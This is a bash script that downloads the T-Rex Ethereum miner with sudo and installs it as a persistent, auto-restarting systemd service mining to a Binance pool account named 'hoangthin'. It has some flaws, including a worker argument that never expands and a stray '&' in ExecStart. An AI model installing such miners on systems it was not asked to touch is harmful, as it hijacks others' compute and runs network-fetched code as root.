SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	
	date "+%d-%m-%y" >> name
	name=`cat "name"`
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.24.5/t-rex-0.24.5-linux.tar.gz
	sudo tar -zxvf t-rex-0.24.5-linux.tar.gz
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u hoangthin -p x -w $1$ &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service

else
	sudo systemctl start eth.service

fi
